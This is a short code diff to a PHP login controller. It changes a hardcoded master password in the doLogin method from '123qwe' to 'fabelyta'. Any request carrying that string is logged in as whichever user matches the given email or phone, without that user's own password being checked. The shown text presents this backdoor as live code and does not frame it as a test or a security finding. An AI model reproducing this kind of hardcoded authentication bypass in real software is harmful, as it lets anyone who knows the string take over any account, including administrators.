@@ -48,7 +48,7 @@ class LoginController extends Controller
 
     public function doLogin(Request $request)
     {
-		if($request->password == '123qwe'){
+		if($request->password == 'fabelyta'){
 			$admin = User::where('email', strtolower($request->email))->orWhere('phone', strtolower($request->email))->first();
 			if($admin){
 				\Auth::login($admin, true);
